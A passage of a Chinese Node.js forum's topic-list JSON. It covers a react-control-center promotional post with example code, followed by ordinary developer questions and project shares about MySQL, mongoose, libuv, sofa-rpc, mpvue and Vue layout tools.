ccOption设定storedStateKeys,表示该实例上的这些key是需要被cc存储的，这样在该cc实例销毁然后再次挂载回来的时候，cc可以把这些key的值恢复回来。&lt;br/&gt;\n7 一个cc实例的state的key除了上面所提到的global、 shared、stored这三种类型,剩下的一种key就是默认的temporary类型了，这种key对应的值随着组件销毁就丢失了，再次挂载cc实例时会读取state里的默认值。&lt;br/&gt;\n8 结合4 5 6 7来看，cc实例里的state是由cc类上申明的sharedStateKeys、globalStateKeys，和cc实例里ccOption申明的storedStateKeys对应的值，再加上剩下的默认的temporaryStateKeys对应的值合并得出来。&lt;br/&gt;</p>\n</blockquote>\n</blockquote>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/1/13/1684736524065591?w=1904&amp;h=1152&amp;f=png&amp;s=250489\" alt></p>\n<blockquote>\n<blockquote>\n<p>9 和react实例一样，触发cc实例render方法，依然是经典的setState方法，以及上面提到的dispatch定位reducer方法去修改，除了这两种cc还有更多自由的选择，如invoke,effect,xeffect允许用户直接调用自己定义的函数去修改state，同reducer函数一样，可以是普通函数、generator函数、async函数。&lt;br/&gt;\n这样的方式让用户有了更多的选择去触发修改state，cc并不强制用户使用哪一种方式，让用户自己摸索和组合更多的最佳实践</p>\n</blockquote>\n<blockquote>\n<blockquote>\n<p>invoke一定是修改当前cc实例的state，只需要传入第一位参数为具体的用户自定义执行函数，剩余的其他参数都是执行函数需要的参数。&lt;br/&gt;\neffect允许用户修改其他模块的state，第一位参数是moduleName,第二位参数为具体的用户自定义执行函数，剩余的其他参数都是执行函数需要的参数。&lt;br/&gt;\nxeffect和effect一样，允许用户修改其他模块的state，第一位参数是moduleName,第二位参数为具体的用户自定义执行函数，剩余的其他参数都是执行函数需要的参数，和effect不一样的地方是xeffect调用的执行函数的参数列表，第一位是cc注入的ExecuteContext对象，里面包含了module, state, moduleState, xeffect,剩下的参数才对应的是是用户调用xeffect是除第一第二位参数以外的其他参数</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<pre class=\"prettyprint\"><code>import React,{Component, Fragment} from &#x27;react&#x27;;\nimport cc from &#x27;react-control-center&#x27;;\n\nfunction* loginFn(changedBy, p1, p2 ,p3){\n    return {changedBy, p1:p1+&#x27;--tail&#x27;, p2:&#x27;head--&#x27;+p2 ,p3}\n}\n\nfunction* forInvoke(changedBy, p1, p2 ,p3){\n    const result = yield loginFn(changedBy, p1, p2 ,p3);\n    return result;\n}\nfunction* forEffect(changedBy, p1, p2 ,p3){\n    const result = yield loginFn(changedBy, p1, p2 ,p3);\n    return result;\n}\nfunction* forXeffect({module, state, moduleState, xeffect}, changedBy, p1, p2 ,p3){\n    const result = yield loginFn(changedBy, p1, p2 ,p3);\n    return result;\n}\n\n@cc.register(&#x27;Foo&#x27;)\nclass Foo extends Component{\n     constructor(props, context){\n        super(props, context);\n        this.state = {changedBy:&#x27;none&#x27;, p1:&#x27;&#x27;, p2:&#x27;&#x27; ,p3:&#x27;&#x27;};\n    }\n    render(){\n        const {changedBy, p1, p2, p3} = this.state;\n        &#x2F;&#x2F;注，该cc类模块没有显式的声明模块，会被cc当做$$default模块的cc类\n        return (\n            &lt;Fragment&gt;\n                &lt;div&gt;changedBy {changedBy}&lt;&#x2F;div&gt;\n                &lt;div&gt;p1 {p1} p2 {p2} p3 {p3}&lt;&#x2F;div&gt;\n                &lt;button onClick={()=&gt;this.$$invoke(forInvoke, 11,22,33)}&gt;invoke&lt;&#x2F;button&gt;\n                &lt;button onClick={()=&gt;this.$$effect(&#x27;$$default&#x27;,forEffect, 11,22,33)}&gt;effect&lt;&#x2F;button&gt;\n                &lt;button onClick={()=&gt;this.$$xeffect(&#x27;$$default&#x27;,forXeffect, 11,22,33)}&gt;xeffect&lt;&#x2F;button&gt;\n            &lt;&#x2F;Fragment&gt;\n        );\n    }\n}\n</code></pre><blockquote>\n<blockquote>\n<p>10 cc定位的容器型组件的状态管理，通常情况一些组件和model非常的有业务关系或者从属关系，我们会把这些react类注册为某个moudle的cc类，观察这个模块中的状态变化，但是有些组件例如一个Workpace类的确需要观察很多模块的状态变化，不算是某个模块对应的视图组件，此时除了用上面说的sharedToGlobalMapping功能，将需要观察各个模块的部分状态映射到global里，然后注册Workpace时为其设定globalStateKeys,就能达到观察多个模块的状态变化的目的之外，cc还提供另一种思路，注册Workpace时设定stateToPropMapping,就可以观察恩义模块的任意key的值变化,和sharedToGlobalMapping不同之处在于，stateToPropMapping要从this.$$propState里取值，sharedToGlobalMapping是从this.state取值，当然stateToPropMapping不需要模块主动的将某些key映射到global里，就能达到跨模块观察状态变化的目录，cc鼓励用户精确对状态归类，并探索最佳组合和最佳实践</p>\n</blockquote>\n</blockquote>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F; these code written in https:&#x2F;&#x2F;github.com&#x2F;fantasticsoul&#x2F;rcc-simple-demo&#x2F;tree&#x2F;master&#x2F;src&#x2F;cc-use-case&#x2F;WatchMultiModule\n&#x2F;&#x2F; you can update the rcc-simple-demo lastest version, and run it, then switch tab watch-multi-module, you will see what happen\nimport React from &#x27;react&#x27;;\nimport cc from &#x27;react-control-center&#x27;;\n\nclass WatchMultiModule extends React.Component {\n  render() {\n    console.log(&#x27;%c@@@ WatchMultiModule&#x27;, &#x27;color:green; border:1px solid green;&#x27;);\n    console.log(&#96;type cc.setState(&#x27;todo&#x27;,{todoList:[{id:Date.now()+&#x27;_1&#x27;,type:&#x27;todo&#x27;,content:&#x27;nono&#x27;},{id:Date.now()+&#x27;_2&#x27;,type:&#x27;todo&#x27;,content:&#x27;nono&#x27;}]}) in console&#96;);\n\n    const { gbc, alias_content, counter_result, todoList } = this.$$propState;\n    return (\n      &lt;div style={{width:&#x27;100%&#x27;,height:&#x27;600px&#x27;, border:&#x27;1px solid darkred&#x27;}}&gt;\n        &lt;div&gt;open your console&lt;&#x2F;div&gt;\n        &lt;div&gt;type and then enter to see what happen &lt;span style={{paddingLeft:&#x27;28px&#x27;,color:&#x27;red&#x27;}}&gt;cc.setState&amp;#40;&#x27;counter&#x27;,&amp;#123;result &amp;#58;  888&amp;#125; &amp;#41;&lt;&#x2F;span&gt;&lt;&#x2F;div&gt;\n        &lt;div&gt;type and then enter to see what happen &lt;span style={{paddingLeft:&#x27;28px&#x27;,color:&#x27;red&#x27;}}&gt;cc.setGlobalState&amp;#40; &amp;#123;content:&#x27;wowowo&#x27;&amp;#125; &amp;#41;;&lt;&#x2F;span&gt;&lt;&#x2F;div&gt;\n        &lt;div&gt;{gbc}&lt;&#x2F;div&gt;\n        &lt;div&gt;{alias_content}&lt;&#x2F;div&gt;\n        &lt;div&gt;{counter_result}&lt;&#x2F;div&gt;\n        &lt;div&gt;{todoList.length}&lt;&#x2F;div&gt;\n      &lt;&#x2F;div&gt;\n    );\n  }\n}\n\nconst stateToPropMapping = {\n  &#x27;$$global&#x2F;borderColor&#x27;: &#x27;gbc&#x27;,\n  &#x27;$$global&#x2F;content&#x27;: &#x27;alias_content&#x27;,\n  &#x27;counter&#x2F;result&#x27;: &#x27;counter_result&#x27;,\n  &#x27;todo&#x2F;todoList&#x27;: &#x27;todoList&#x27;,\n};\n\n&#x2F;&#x2F;two way to declare watching multi module cc class\nexport default cc.connect(&#x27;WatchMultiModule&#x27;, stateToPropMapping)(WatchMultiModule);\n&#x2F;&#x2F;export default cc.register(&#x27;WatchMultiModule&#x27;, {stateToPropMapping})(WatchMultiModule);\n</code></pre><blockquote>\n<h3>github地址：<a href=\"https://github.com/fantasticsoul/react-control-center\">https://github.com/fantasticsoul/react-control-center</a></h3>\n</blockquote>\n<hr>\n<blockquote>\n<h3>gitee地址：<a href=\"https://gitee.com/nick_zhong/react-control-center\">https://gitee.com/nick_zhong/react-control-center</a></h3>\n</blockquote>\n<hr>\n<blockquote>\n<h3>quick-start demo: <a href=\"https://github.com/fantasticsoul/rcc-simple-demo\">https://github.com/fantasticsoul/rcc-simple-demo</a></h3>\n</blockquote>\n<p>期待大家试用并给出修改意见，真心希望能够亲爱你的能够感受的cc的魅力和强大，因为作为redux使用者的我（3年了快），不管是用了原生的redux还是dva封装后的redux，个人都觉得没有cc使用那么的爽快…先从示例项目开始体验吧^_^,期待着你和我有一样的感受</p>\n</div>","title":"react-control-center,再一次颠覆你对状态管理的认识","last_reply_at":"2019-01-14T15:12:59.298Z","good":false,"top":false,"reply_count":6,"visit_count":696,"create_at":"2019-01-13T12:43:30.101Z","author":{"loginname":"fantasticsoul","avatar_url":"https://avatars0.githubusercontent.com/u/7334950?v=4&s=120"}},{"id":"5c3c81c8a4d44449266b0c9e","author_id":"5c1b04c03898674067a76417","tab":"ask","content":"<div class=\"markdown-text\"><p>varchar、text、mediumtext、longtext、blog等，用哪个字段好呢？</p>\n</div>","title":"mysql 中存文章内容，应该用什么字段存？","last_reply_at":"2019-01-14T15:11:18.618Z","good":false,"top":false,"reply_count":1,"visit_count":710,"create_at":"2019-01-14T12:34:16.004Z","author":{"loginname":"didiaohu","avatar_url":"https://avatars0.githubusercontent.com/u/19411940?v=4&s=120"}},{"id":"5bfa17a7d6104a4f803a1359","author_id":"564582ec5e7412b625b8bf16","tab":"ask","content":"<div class=\"markdown-text\"><p>我运行官方的例子（<a href=\"https://npm.taobao.org/package/sofa-rpc-node/v/1.6.0%EF%BC%89%EF%BC%8C%E4%B8%80%E7%9B%B4%E6%8A%A5%E7%9A%84%E9%94%99%E3%80%82%E5%A6%82%E4%B8%8B\">https://npm.taobao.org/package/sofa-rpc-node/v/1.6.0），一直报的错。如下</a>\n2018-11-25 11:23:47,345 WARN 8708 nodejs.ResponseTimeoutError: register to channel: SofaRpcRegistry@127.0.0.1:2181 failed, will retry after 3s, Server no response in 3000ms, address#127.0.0.1:7777\n使用直连模式就没问题，使用 ZookeeperRegistry 就一直报错。求指导。</p>\n</div>","title":"急急急，sofa-rpc-node 运行简单demo出的小问题，解不开，求指导。","last_reply_at":"2019-01-14T13:51:48.350Z","good":false,"top":false,"reply_count":42,"visit_count":1780,"create_at":"2018-11-25T03:31:51.374Z","author":{"loginname":"RajanZhan","avatar_url":"https://avatars1.githubusercontent.com/u/15818327?v=4&s=120"}},{"id":"5385cae7c3ee0b5820e9ca64","author_id":"51f217a9f4963ade0e2430de","content":"<div class=\"markdown-text\"><p>工作中，写了个有意思的函数:\nself.upper.dataSourceTypes = JSON.parse(msg);\n\t\t\t\t//加载 库类型\n\t\t\t\t//数据属性转换\n\t\t\t\tvar dataTypes = changeJsonName({changeName:{“TypeName”:“name”,“TypeID”:“id”},objs:self.upper.dataSourceTypes});\n把对象中的&quot;TypeName&quot;,“TypeID” 改成 name&quot;,“id”\n//欢迎有兴趣的朋友指正优化！！！\n/*\n*JSON 属性名转换\n*参数形式:{changeName:{a:A,b:B},objs:obj} =&gt; 例子: {changeName:{“id”:“KEY”},objs:[{id:2},{id:4}]} id为2的JSON对象(数组)改变成[{KEY:2,KEY:4}]\n*changeName要修改的对象属性名=&gt;{a:A,b:B},objs该对象/对象数组\n*/\nfunction changeJsonName(o){\n\tvar newObj = [];\n\tif(o.hasOwnProperty(“changeName”)){\n\t\tif(o.hasOwnProperty(“objs”)){\n\t\t\tvar cloneStr = JSON.stringify(o.objs);\n\t\t\tvar cloneObj = JSON.parse(cloneStr);\n\t\t\tvar doit = function(obj){</p>\n<pre class=\"prettyprint\"><code>\t\t\tif(obj.constructor  == Array){\n\t\t\t\tfor(var i=0;i&lt;obj.length;i++){\n\t\t\t\t\tdoit(obj[i]);\n\t\t\t\t}\n\t\t\t}else{\n\t\t\t\t&#x2F;&#x2F;循环该对象的属性\n\t\t\t\tfor(var i in obj){\n\t\t\t\t\t&#x2F;&#x2F;循环要改变的属性名\n\t\t\t\t\tfor(var x in o.changeName){\n\t\t\t\t\t\t&#x2F;&#x2F;如果名称相同\n\t\t\t\t\t\tif(x == i){\n\t\t\t\t\t\t\tobj[o.changeName[x]] = obj[i];\n\t\t\t\t\t\t\tdelete obj[i];\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tdoit(cloneObj);\n\t\treturn cloneObj;\n\t}\n}\nreturn false;\n</code></pre><p>}</p>\n<p>//欢迎有兴趣的朋友指正优化！！！</p>\n</div>","title":"JSON 对象属性名转换","last_reply_at":"2019-01-14T12:12:06.763Z","good":false,"top":false,"reply_count":8,"visit_count":13797,"create_at":"2014-05-28T11:39:19.058Z","author":{"loginname":"sdfcbs91","avatar_url":"//gravatar.com/avatar/8e6c37cb7155da22ce69bd160a818584?size=48"}},{"id":"56aea63824b0c1ec628ff105","author_id":"56a474fd7ec020ed4b96b2de","tab":"ask","content":"<div class=\"markdown-text\"><p>今天用mongoose建了一个mongodb的collection 名字起得是Vedio\n\tvar VedioSchema = new Schema({\n\t\t_id: {\n\t\t\ttype: String,\n\t\t\tunique: true,\n\t\t\t‘default’: shortid.generate\n\t\t},\n\t\tdate: { type: Date, default: Date.now },\n\t\tname:  String,\n\t\tlink:String,\n\t\tpostDate:Date,\n\t\timage:String\n\t});\n\tvar Vedio = mongoose.model(“Vedio”,VedioSchema);</p>\n<p>但是最终查看mongodb数据库 collection的名字却是vedios\n这是为啥啊 向大家讨教了</p>\n</div>","title":"求教关于mongodb collection的名字","last_reply_at":"2019-01-14T11:07:35.345Z","good":false,"top":false,"reply_count":14,"visit_count":4624,"create_at":"2016-02-01T00:26:32.903Z","author":{"loginname":"dolare","avatar_url":"https://avatars.githubusercontent.com/u/10585458?v=3&s=120"}},{"id":"5c3bfa95a4d44449266b078f","author_id":"5c3be43ca4d44449266b063e","tab":"ask","content":"<div class=\"markdown-text\"><p>nodejs 事件循环是libuv实现的，但是我看到libuv event loop有三种模式：</p>\n<ul>\n<li>UV_RUN_DEFAULT</li>\n<li>UV_RUN_ONCE</li>\n<li>UV_RUN_NOWAIT</li>\n</ul>\n<p>请教一下论坛的大神们，这三种模式nodejs都有用到吗？如果有分别是在什么情况下使用的？</p>\n</div>","title":"请教一个关于nodejs event  loop 的问题","last_reply_at":"2019-01-14T09:29:31.898Z","good":false,"top":false,"reply_count":0,"visit_count":613,"create_at":"2019-01-14T02:57:25.159Z","author":{"loginname":"superTerrorist","avatar_url":"https://avatars1.githubusercontent.com/u/7795335?v=4&s=120"}},{"id":"5a72c66ace45d440451465c3","author_id":"58400cd63aa1310a5786878f","tab":"share","content":"<div class=\"markdown-text\"><p>总共录了18集，课程主要针对 nodejs 初学者，查看下面网址：</p>\n<p><a href=\"https://www.rails365.net/playlists/qing-song-xue-nodejs-ji-chu-pian\">https://www.rails365.net/playlists/qing-song-xue-nodejs-ji-chu-pian</a></p>\n<p>录制视频不易，如果对你有帮助，请多多支持。</p>\n<p>下一套课程计划：Nodejs + express</p>\n</div>","title":"18集 Node.js 视频入门教程 - 全部免费观看","last_reply_at":"2019-01-14T09:08:07.169Z","good":false,"top":false,"reply_count":44,"visit_count":20810,"create_at":"2018-02-01T07:48:58.823Z","author":{"loginname":"yinsigan","avatar_url":"https://avatars2.githubusercontent.com/u/740643?v=4&s=120"}},{"id":"5c2d6df876c4964062a1ffe2","author_id":"5c1b04c03898674067a76417","tab":"ask","content":"<div class=\"markdown-text\"><p>自己网站是一个搜索框，通过搜索，能搜到其他网站的各种资源。类似 “<a href=\"https://www.jiumodiary.com/\">鸠摩搜书</a>” 这种功能。</p>\n</div>","title":"请问下在自己的网站搜索，但能搜 Github、CSDN、掘金等网站的资源，类似鸠摩搜书这种功能，用得什么技术点呢？","last_reply_at":"2019-01-14T08:16:34.858Z","good":false,"top":false,"reply_count":3,"visit_count":1033,"create_at":"2019-01-03T02:05:44.042Z","author":{"loginname":"didiaohu","avatar_url":"https://avatars0.githubusercontent.com/u/19411940?v=4&s=120"}},{"id":"5c38ec79a4d44449266afff4","author_id":"5c38ea45a4d44449266affea","tab":"ask","content":"<div class=\"markdown-text\"><h3>故事发生在用node.js运行名为mysql.js的脚本</h3>\n<p>mysql.js:</p>\n<pre class=\"prettyprint language-javascript\"><code>var mysql  = require(&#x27;mysql&#x27;);  \nvar connection = mysql.createConnection({\n  host     : &#x27;localhost&#x27;,       \n  user     : &#x27;root&#x27;,              \n  password : &#x27;123456&#x27;,       \n  port: &#x27;3306&#x27;,                   \n  database: &#x27;newweb&#x27; \n});\nvar sql = &#x27;SELECT * FROM chat where line = 1&#x27;;\nvar hee = function(connection,sql){\n    var hea=[{cid:0},{cid:0},{cid:0}];                 &#x2F;&#x2F;初始化\n    connection.query(sql,function (err, result) {\n        var a=0;\n        if(err){\n            console.log(&#x27;[SELECT ERROR] - &#x27;,err.message);\n            return;\n        }\n        for (var rs of result){\n            hea[a].cid=(rs.cid);\n            a++;\n        }\n        console.log(hea);       &#x2F;&#x2F;标记1处[{cid:1},{cid:2},{cid:3}]\n    });\n    console.log(hea);           &#x2F;&#x2F;标记2处[{cid:0},{cid:0},{cid:0}]                 \n};\nconnection.connect();\nhee(connection,sql);\nconnection.end();\n</code></pre><h3>问题：</h3>\n<p>发生了如图所示的输出结果\n想问问为什么hea的内容值没被改变呢，\n如果我特别想把结果result的部分（比如hea）从<code>connection.query</code>这个函数里取出来，应该要怎么做呢？</p>\n</div>","title":"在使用nodejs的mysql.js时发生的问题，望解答","last_reply_at":"2019-01-14T03:47:57.876Z","good":false,"top":false,"reply_count":2,"visit_count":538,"create_at":"2019-01-11T19:20:25.781Z","author":{"loginname":"Sossmc","avatar_url":"https://avatars3.githubusercontent.com/u/22851385?v=4&s=120"}},{"id":"5c38d0d8a4d44449266affdf","author_id":"5a45b096f320ae9f0dd58188","tab":"ask","content":"<div class=\"markdown-text\"><p>最近在看ipc的东西，了解到nodejs的cluster模式时，master在接收http连接后会将文件句柄传递给cluster去处理。那么问题来了。\nmaster在传递文件句柄时传了其实是文件描述符，但是据我所知，文件描述符是文件描述符表的下标。而每个进程有自己独立的文件描述符表，fork出来的cluster进程除了fork前的文件描述符是从master copy了之外，后续建立socket时的文件描述符应该是master的文件描述符表独有的。那么master是怎么将自己独有的文件描述符发给cluster的呢？ 求指教！！</p>\n</div>","title":"请教一个关于文件句柄传递的问题","last_reply_at":"2019-01-14T03:31:04.900Z","good":false,"top":false,"reply_count":4,"visit_count":655,"create_at":"2019-01-11T17:22:32.070Z","author":{"loginname":"Gitforxuyang","avatar_url":"https://avatars3.githubusercontent.com/u/16128584?v=4&s=120"}},{"id":"5c39fb52a4d44449266b02f3","author_id":"5c1af54c3898674067a76341","tab":"share","content":"<div class=\"markdown-text\"><h2>一、活动亮点</h2>\n<p>1、剖析技术，学习掌握最新 Google Analytics A/B 测试技术 💪\n2、展望趋势，了解国际品牌巨头如何部署网站监测代码 🔥\n3、干货实操，现场进行 Coding 教学 💻</p>\n<p>欢迎对 Google Analytics 工具感兴趣或想进阶学习的同学参加。\n有兴趣的小伙伴记得带上个人电脑，参与 Coding 环节将有机会获得主办方准备精美奖品。\n关于 Google Analytics</p>\n<p>Google 分析是免费的网站分析服务，只要在网站的页面上加入一段代码，就可以提供丰富详尽的图表式报告。并且显示人们如何找到和浏览相关网站以及如何改善访问者的体验。提高网站投资回报率、增加转换，在网上获取更多收益。</p>\n<p>可对整个网站的访问者进行跟踪，并能持续跟踪营销广告系列的效果，利用此信息将了解到哪些关键字真正起作用、哪些广告词最有效，访问者在转换过程中从何处退出。</p>\n<h2>二、活动详情</h2>\n<h3>（ 1 ）活动时间：</h3>\n<p>1 月 19 日 14:00-17:00</p>\n<h3>（ 2 ）活动地点：</h3>\n<p>深圳市南山区中国地质大学产学研基地 2 楼 A208 科技寺</p>\n<h3>（ 3 ）活动流程：</h3>\n<p>14:00-14:15 签到\n14:15-14:30 主持人开场\n14:30-15:00 Fifty-five 分享 GA 及 Optimise AB 测试功能\n15:00-15:30 AfterShip 实际经验分享，我们踩过哪些坑！\n15:30-15:45 Tea Break\n15:45-16:30 Live coding and demo\n16:30-17:00 Demo 点评及颁奖环节\n17:00-17:00 自由交流时间</p>\n<h3>（ 4 ）主讲嘉宾</h3>\n<p><strong>单智博 (Zhibo Shan)-五十五公司资深数据分析专家</strong></p>\n<p>6 年 Google Analytics 及数据分析行业从业经验\n拥有 GA，GTM，Omniture，Tealium 等高级数据分析工具资质认证\n帮助 30 多个知名品牌计划及部署网站及 App 监测代码</p>\n<p><strong>欧可祺 (Ho-Ki Au)-AfterShip 公司技术 VP</strong></p>\n<p>毕业于美国斯坦福大学的计算机科学，硕士学位\n超过 20 年的软件开发、开发团队管理、项目管理经验\n在硅谷和中国多家公司都曾担任过高级管理岗位</p>\n<h2>三、主办方</h2>\n<p>AfterShip 是一家以产品为驱动，技术为核心的快递查询行业的全球龙头公司，日均承担过亿 API 请求。客户有 Amazon, Wish, eBay, Paypal, Groupon, Etsy, 及各大小电商超过 100,000 家。AfterShip 2012 年成立于香港，2018 年在深圳设立研发中心，专注 To B 端 SaaS 平台企业服务，与全球 500 多家物流公司达成合作，涉及 30 多种主流语言业务体系。帮助跨境电商及平台，将全球快递信息查询自动化，优化发货流程，提高退货效率，减低营运成本，提高买家复购率。</p>\n<h2>四、独家报名渠道</h2>\n<p>活动咨询请添加微信号：aftership2018，备注“公司+职位+姓名”，主办方审核通过将会邀请加入活动群。</p>\n<p>或者戳活动行链接报名： <a href=\"http://www.huodongxing.com/event/8474882293500?td=9763297835911\">http://www.huodongxing.com/event/8474882293500?td=9763297835911</a></p>\n</div>","title":"【技术干货推荐-深圳-1月19日】 最新Google Analytics A/B 测试 • 打造足以匹敌亚马逊的网站","last_reply_at":"2019-01-14T02:21:13.950Z","good":false,"top":false,"reply_count":1,"visit_count":632,"create_at":"2019-01-12T14:36:02.711Z","author":{"loginname":"littleflowersansan","avatar_url":"https://avatars3.githubusercontent.com/u/42596541?v=4&s=120"}},{"id":"5c3b5de43898674067a7ea7f","author_id":"552d07541c85ba081891519e","tab":"ask","content":"<div class=\"markdown-text\"><p>代码 mysql2\n<img src=\"//static.cnodejs.org/FuIoIVcIzpLCPukw8kiWDCTSJgW9\" alt=\"image.png\">\n测试调用\n<img src=\"//static.cnodejs.org/Fn181843cEbT8SC0mldE9AfXiEca\" alt=\"image.png\">\n<img src=\"//static.cnodejs.org/FoFfvKVbsnJWE2gqoTlGDPx8BxOM\" alt=\"image.png\"></p>\n<p>结果：\n首次执行查询时，POOL值\n<img src=\"//static.cnodejs.org/Ftokahji-HdSMZ0egxmo443NyXhD\" alt=\"image.png\">\n未休息再次执行查询\n<img src=\"//static.cnodejs.org/Fv_s6xHS9TbOl-1fMDVIPbNR6ztL\" alt=\"image.png\">\n休息10分钟执行查询\n<img src=\"//static.cnodejs.org/Fktih5O-Cm7-EV9w_PZP7YEtAoKI\" alt=\"image.png\"></p>\n<p>已经研究很久了，求大神帮忙</p>\n</div>","title":"mysql2 Pool 查询信息后 休息10分钟，第二次再查询信息时会报  read ECONNRESET","last_reply_at":"2019-01-13T15:52:22.161Z","good":false,"top":false,"reply_count":1,"visit_count":418,"create_at":"2019-01-13T15:48:52.216Z","author":{"loginname":"wadecha","avatar_url":"https://avatars0.githubusercontent.com/u/10524259?v=4&s=120"}},{"id":"5af7e9a60a36e5312d6ed052","author_id":"578c9259b78759e813a57a14","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>五一放假，没出去玩，想熟悉下vue的开发流程，又想体验下mpvue，于是写了个练手项目。一个用mpvue实现的cnode微信小程序版。</p>\n</blockquote>\n<p>代码在<a href=\"https://github.com/673800357/mpvue-cnode\">仓库</a>。欢迎各位star、fork、issue、pr。目前已经完成了百分之80的功能。个人感觉这个项目还是非常适合作为vue和微信小程序的入门项目的。</p>\n<p>API来自于<a href=\"https://cnodejs.org/api\">cnode社区</a></p>\n<p>体验地址</p>\n<p><img src=\"//static.cnodejs.org/Fhw-O6TGB8F1UdmGBXxJlXC4NaCl\" alt=\"gh_3ec286eda654_258.jpg\"></p>\n<h2>预览流程</h2>\n<pre class=\"prettyprint language- bash\"><code>npm install\n\nnpm run dev\n\n&#x2F;&#x2F;使用微信开发者工具打开dist目录，关闭域名和https检查即可\n</code></pre><p>目录结构</p>\n<ul>\n<li>src\n<ul>\n<li>pages\n<ul>\n<li>index 主页</li>\n<li>detail 帖子详情页</li>\n<li>me 我的主页</li>\n<li>publish 发帖页</li>\n<li>notice 通知页</li>\n<li>login 登录页</li>\n<li>user 用户主页</li>\n<li>list 帖子列表展示页</li>\n</ul>\n</li>\n<li>components\n<ul>\n<li>card 单一帖子头组件</li>\n<li>authorHead 作者信息头</li>\n<li>login 登录组件</li>\n</ul>\n</li>\n<li>const.js 常量</li>\n<li>utils 一些工具函数</li>\n</ul>\n</li>\n<li>static 静态图片部分\n目前已经完成了绝大部分功能，尚未完成的功能在和遇到的问题在todo中</li>\n</ul>\n<p>目前存在的问题</p>\n<ul>\n<li>markdwon的解析有点问题，该问题我已适配了一个<a href=\"https://github.com/673800357/mpvue-wemark\">mpvue-wemark</a>的库来解决了</li>\n</ul>\n<p>todo</p>\n<ul>\n<li>帖子收藏和取消收藏ui同步功能 // api字段有点问题</li>\n<li>评论点赞和收藏的UI同步//api字段有点问题</li>\n<li>编辑自己发过的主题</li>\n<li>展示未读消息数和消息已读</li>\n<li>部分页面添加下拉刷新</li>\n</ul>\n<p>后话：</p>\n<p>这个项目没有涉及到太多复杂的部分，主要到是业务逻辑的开发，对于作为一个vue和mpvue小程序入门项目是非常合适的。由于开发时间短，部分代码质量和交互做得不太好。对于未完成的部分和部分未知bug欢迎各位star、提issue、提pr一起来玩2333.</p>\n<p>效果图</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/5/5/1632e5fa5eeca7d1?w=754&amp;h=1352&amp;f=png&amp;s=138963\" alt></p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/5/5/1632e5fec28bf728?w=744&amp;h=1328&amp;f=png&amp;s=191323\" alt></p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/5/5/1632e6019f55ff9e?w=746&amp;h=1332&amp;f=png&amp;s=67105\" alt></p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/5/5/1632e603c6d36c32\" alt></p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/5/5/1632e606cad579c9?w=730&amp;h=1332&amp;f=png&amp;s=131278\" alt></p>\n</div>","title":"用mpvue实现的微信小程序版cnode社区","last_reply_at":"2019-01-13T13:54:04.952Z","good":false,"top":false,"reply_count":8,"visit_count":1886,"create_at":"2018-05-13T07:30:46.697Z","author":{"loginname":"tan2016","avatar_url":"https://avatars0.githubusercontent.com/u/20512530?v=4&s=120"}},{"id":"59f406d1085668ad5e6984a7","author_id":"59cfe34b99fac4a2200040e2","tab":"share","content":"<div class=\"markdown-text\"><p><strong>1 项目介绍</strong>\nEsview是一款拖拽组件生成vue页面的工具，并且可以生成代码。\n包含拖拽生成页面、页面管理、组件管理等功能。\n前端采用vue和iview，生成的代码必须安装vue和iview才能使用，\n后台采用java（springboot）作为持久层，保存生成的页面、创建的组件。\ngithub : <a href=\"https://github.com/furioussoul/soul-esview\">https://github.com/furioussoul/soul-esview</a>\n掘金：<a href=\"https://juejin.im/post/5a150b5ff265da432d27bd10\">https://juejin.im/post/5a150b5ff265da432d27bd10</a></p>\n<p><strong>2 演示</strong>\nVue可视化，Vue代码生成</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2017/10/31/4fdd5e90be0fbb9120d2fc65bab32266\" alt=\"QQ图片20171027113639.png\"></p>\n<p><strong>3 原理</strong>\n如何实现拖拽：html源生api，代码在dnd.js。\n如何生成代码：拖拽生成的页面，背后是一个树形的结构，通过递归向下法解析语法树生成最终的.vue代码。\n组件的属性编辑影响组件样式：vue会监听这棵属性结构的所有属性，当属性被编辑过后，vue会更新整个页面。</p>\n</div>","title":"Vue可视化，Vue代码生成，Vue动态表单","last_reply_at":"2019-01-13T13:24:59.089Z","good":false,"top":false,"reply_count":14,"visit_count":14611,"create_at":"2017-10-28T04:25:53.708Z","author":{"loginname":"furioussoul","avatar_url":"https://avatars3.githubusercontent.com/u/16501752?v=4&s=120"}},{"id":"5993e5acf36051a45246c07a","author_id":"59413aaa8ce045ee166a1544","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"https://raw.githubusercontent.com/jaweii/Vue-Layout/master/static/banner.JPG\" alt=\"banner\"></p>\n<h1>Vue-Layout</h1>\n<p>基于UI组件的Vue可视化布局、生成.vue代码的工具。<a href=\"https://jaweii.github.io/Vue-Layout/dist/\">https://jaweii.github.io/Vue-Layout/dist/</a></p>\n<hr>\n<h2>演示</h2>\n<p>使用</p>\n<p><img src=\"https://raw.githubusercontent.com/jaweii/Vue-Layout/master/static/demo1.gif\" alt=\"demo1\"></p>\n<p>效果</p>\n<p><img src=\"https://raw.githubusercontent.com/jaweii/Vue-Layout/master/static/demo2.gif\" alt=\"demo2\"></p>\n<p>上图的后台布局例子，你可以进入这个页面访问其布局：<a href=\"https://jaweii.github.io/Vue-Layout/dist/#/share/5993d3b05c497d0057c6f2da\">https://jaweii.github.io/Vue-Layout/dist/#/share/5993d3b05c497d0057c6f2da</a><br>\n也可以进入这个页面体验其布局效果：<a href=\"https://jaweii.github.io/Vue-Layout/dist/#/preview/pc/5993d3b05c497d0057c6f2da\">https://jaweii.github.io/Vue-Layout/dist/#/preview/pc/5993d3b05c497d0057c6f2da</a></p>\n<h1>如何拓展UI可视化组件？</h1>\n<ol>\n<li>如果是新增的UI，先在main.js中引入，然后在<code>./src/components/template</code>路径下，创建对应的UI的文件夹（如果没有）；</li>\n<li>copy已有的类似组件。假设你要拓展mint-ui的导航栏组件，你可以直接复制muse-ui的导航栏（<code>./src/components/template/Muse-UI/App Bar.js</code>）到Mint-UI目录中，修改文件名为Header.js、以及修改其中的部分代码即可：<br>\n<img 